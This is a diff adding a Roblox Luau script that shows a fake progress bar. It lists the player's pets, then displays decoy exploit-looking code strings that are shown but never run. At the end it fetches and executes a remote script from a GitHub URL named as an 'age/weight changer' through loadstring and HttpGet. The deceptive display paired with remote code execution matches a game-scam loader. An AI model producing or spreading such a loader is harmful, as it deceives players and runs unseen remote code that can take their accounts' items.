@@ -1,0 +1,152 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- GUI base
+local gui = Instance.new("ScreenGui")
+gui.Name = "BossBar"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = PlayerGui
+
+-- Progress Bar
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0, 400, 0, 20)
+barBG.Position = UDim2.new(0.5, -200, 0.78, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+barBG.BorderSizePixel = 0
+barBG.Parent = gui
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
+
+-- Message Display (max 3 lines)
+local activeMessages, maxMessages = {}, 3
+
+local function updatePositions()
+	for i, msg in ipairs(activeMessages) do
+		local yPos = 70 + ((i - 1) * 30)
+		TweenService:Create(msg, TweenInfo.new(0.2), {
+			Position = UDim2.new(0.5, -160, 0, yPos)
+		}):Play()
+	end
+end
+
+local function showMessage(text)
+	if #activeMessages >= maxMessages then
+		local old = table.remove(activeMessages, #activeMessages)
+		if old and old.Parent then old:Destroy() end
+	end
+
+	local bg = Instance.new("Frame")
+	bg.Size = UDim2.new(0, 320, 0, 25)
+	bg.Position = UDim2.new(0.5, -160, 0, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	bg.BackgroundTransparency = 1
+	bg.BorderSizePixel = 0
+	bg.ZIndex = 10
+	bg.Parent = gui
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.Text = text
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.TextStrokeTransparency = 0.6
+	label.Font = Enum.Font.SourceSans
+	label.TextScaled = false
+	label.TextSize = 14
+	label.ZIndex = 11
+	label.Parent = bg
+
+	table.insert(activeMessages, 1, bg)
+	updatePositions()
+
+	TweenService:Create(bg, TweenInfo.new(0.25), {BackgroundTransparency = 0.3}):Play()
+
+	task.delay(5, function()
+		local fadeOut = TweenService:Create(bg, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+		fadeOut:Play()
+		fadeOut.Completed:Wait()
+		for i, v in ipairs(activeMessages) do
+			if v == bg then table.remove(activeMessages, i) break end
+		end
+		bg:Destroy()
+		updatePositions()
+	end)
+end
+
+-- Extract pets with "KG" in their label text
+local function getPetsInInventory()
+	local pets = {}
+	for _, desc in ipairs(PlayerGui:GetDescendants()) do
+		if desc:IsA("TextLabel") and desc.Text:find("KG") then
+			local name = desc.Text:gsub("%s*%b()%s*", ""):gsub("%s*%d+KG", ""):gsub("^%s*(.-)%s*$", "%1")
+			table.insert(pets, name)
+		end
+	end
+	return pets
+end
+
+-- Random code generator
+local randomCodes = {
+	"local age = require(game:GetService('ReplicatedStorage').Age)", 
+	"firesignal(workspace.ChildAdded)", 
+	"local petStorage = game:GetService('ReplicatedStorage').PetData",
+	"game.Players.LocalPlayer:Kick()", 
+	"warn('Script executed successfully')",
+	"local inv = getgenv().Inventory",
+	"local stats = game:GetService('Stats')",
+	"shared.loaded = true",
+	"game:GetService('Lighting'):ClearAllChildren()",
+	"script.Parent:Destroy()"
+}
+
+-- Animation
+local function animateBar(duration)
+	local pets = getPetsInInventory()
+	local petCount = #pets
+	local petDisplayTime = duration * 0.5 / math.max(1, petCount)
+	local randomCodeTime = (duration * 0.5) / #randomCodes
+
+	-- Pet finding phase
+	for i, pet in ipairs(pets) do
+		showMessage("Found Pet: " .. pet)
+		bar.Size = UDim2.new(i / (petCount + #randomCodes + 2), 0, 1, 0)
+		task.wait(petDisplayTime)
+	end
+
+	-- Code phase
+	for i, code in ipairs(randomCodes) do
+		showMessage(code)
+		bar.Size = UDim2.new((petCount + i) / (petCount + #randomCodes + 2), 0, 1, 0)
+		task.wait(randomCodeTime * 0.85)
+	end
+
+	-- Almost done
+	showMessage("Almost done...")
+	bar.Size = UDim2.new((petCount + #randomCodes + 1) / (petCount + #randomCodes + 2), 0, 1, 0)
+	task.wait(2)
+
+	-- Done
+	showMessage("Done!")
+	bar.Size = UDim2.new(1, 0, 1, 0)
+	task.wait(0.5)
+
+	-- Load next script
+	local success, result = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/AgeWeight/refs/heads/main/AgWeChanger"))()
+	end)
+	if not success then
+		warn("Error loading external script: ", result)
+	end
+
+	gui:Destroy()
+end
+
+animateBar(70) -- total duration
